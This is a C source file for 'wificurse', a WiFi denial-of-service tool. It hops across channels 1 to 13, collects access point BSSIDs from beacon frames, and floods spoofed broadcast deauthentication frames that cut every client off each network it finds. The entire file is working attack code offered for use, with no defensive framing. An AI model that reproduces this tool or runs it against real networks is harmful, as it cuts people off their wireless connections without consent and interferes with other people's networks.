/*
    wificurse - WiFi DoS tool
    Copyright (C) 2012  oblique

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <poll.h>
#include <signal.h>
#include "dev.h"
#include "iw.h"
#include "error.h"
#include "console.h"
#include "wificurse.h"


int send_deauth(int fd, uint8_t *ap_mac) {
	struct mgmt_frame *deauth;
	uint16_t *reason;
	ssize_t r;
	int i;

	deauth = malloc(sizeof(*deauth) + sizeof(*reason));
	if (deauth == NULL)
		return_error("malloc");

	memset(deauth, 0, sizeof(deauth));
	deauth->fc.subtype = FRAME_CONTROL_SUBTYPE_DEAUTH;
	/* broadcast mac (ff:ff:ff:ff:ff:ff) */
	memset(deauth->dest_mac, '\xff', IFHWADDRLEN);
	memcpy(deauth->src_mac, ap_mac, IFHWADDRLEN);
	memcpy(deauth->bssid, ap_mac, IFHWADDRLEN);
	reason = (uint16_t*)&deauth->frame_body;
	/* reason 7: Class 3 frame received from nonassociated STA */
	*reason = htons(7);

	/* flood the network */
	for (i=0; i<128; i++) {
		deauth->sc.sequence = i;
		do {
			r = iw_write(fd, deauth, sizeof(*deauth) + sizeof(*reason));
		} while (r == ERRAGAIN);
		if (r < 0) {
			free(deauth);
			return r;
		}
		usleep(1000);
	}

	free(deauth);

	return 0;
}

int read_bssid(int fd, uint8_t *bssid) {
	uint8_t buf[256], *pkt;
	size_t pkt_sz;
	ssize_t r;
	struct mgmt_frame *beacon;

	r = iw_read(fd, buf, sizeof(buf), &pkt, &pkt_sz);
	if (r < 0)
		return r;

	beacon = (struct mgmt_frame*)pkt;

	/* if it's a beacon packet */
	if (beacon->fc.subtype == FRAME_CONTROL_SUBTYPE_BEACON) {
		memcpy(bssid, beacon->bssid, IFHWADDRLEN);
		return 0;
	}

	return ERRNODATA;
}


int main(int argc, char *argv[]) {
	struct dev dev;
	struct ap_list apl;
	uint8_t bssid[IFHWADDRLEN];
	sigset_t exit_sig;
	struct pollfd pfd[2];
	time_t tm1;
	int chan, ret, sigfd;

	if (argc != 2) {
		fprintf(stderr, "\n  WiFi Curse v" VERSION " (C) 2012  oblique\n\n");
		fprintf(stderr, "  usage: wificurse <interface>\n\n");
		return EXIT_FAILURE;
	}

	if (getuid()) {
		fprintf(stderr, "Not root?\n");
		return EXIT_FAILURE;
	}

	/* init access point list */
	init_ap_list(&apl);

	/* init signals */
	sigemptyset(&exit_sig);
	sigaddset(&exit_sig, SIGINT);
	sigaddset(&exit_sig, SIGTERM);

	if (sigprocmask(SIG_BLOCK, &exit_sig, NULL) < 0) {
		err_msg("sigprocmask");
		return EXIT_FAILURE;
	}

	sigfd = signalfd(-1, &exit_sig, 0);
	if (sigfd < 0) {
		err_msg("signalfd");
		return EXIT_FAILURE;
	}

	pfd[0].fd = sigfd;
	pfd[0].revents = 0;
	pfd[0].events = POLLIN;

	/* init device */
	init_dev(&dev);
	strncpy(dev.ifname, argv[1], sizeof(dev.ifname)-1);

	if (iw_open(&dev) < 0) {
		print_error();
		goto _errout;
	}

	if (!iw_can_change_channel(&dev)) {
		fprintf(stderr, "%s can not change channels in monitor mode.\n"
			"Maybe you need to patch your kernel with:\n"
			"  patches/cfg80211_monitor_mode_channel_fix.patch\n", dev.ifname);
		goto _errout;
	}

	pfd[1].fd = dev.fd;
	pfd[1].revents = 0;
	pfd[1].events = POLLIN;

	tm1 = time(NULL);
	chan = 1;

	if (iw_set_channel(&dev, chan) < 0) {
		print_error();
		goto _errout;
	}

	clear_scr();
	update_scr(&apl, &dev);

	while (1) {
		if (poll(pfd, 2, 0) < 0) {
			err_msg("poll");
			goto _errout;
		}

		if (pfd[0].revents & POLLIN) /* got SIGTERM or SIGINT */
			break;

		if (pfd[1].revents & POLLIN) {
			ret = read_bssid(dev.fd, bssid);
			if (ret < 0 && ret != ERRNODATA) { /* error */
				print_error();
				goto _errout;
			} else if (ret == 0) { /* got BSSID */
				if (add_or_update_ap(&apl, bssid) < 0) {
					print_error();
					goto _errout;
				}
				update_scr(&apl, &dev);
				if (send_deauth(dev.fd, bssid) < 0) {
					print_error();
					goto _errout;
				}
			}
		}

		/* change channel every 3 seconds */
		if (time(NULL) - tm1 >= 3) {
			int n = 0;
			do {
				chan = (chan % 13) + 1;
				ret = iw_set_channel(&dev, chan);
				/* if fails try next channel */
			} while(++n < 13 && ret < 0);
			if (ret < 0) {
				print_error();
				goto _errout;
			}
			clear_deauth(&apl);
			update_scr(&apl, &dev);
			tm1 = time(NULL);
		}
	}

	printf("\nExiting..\n");
	iw_close(&dev);
	free_ap_list(&apl);
	return EXIT_SUCCESS;
_errout:
	iw_close(&dev);
	free_ap_list(&apl);
	return EXIT_FAILURE;
}
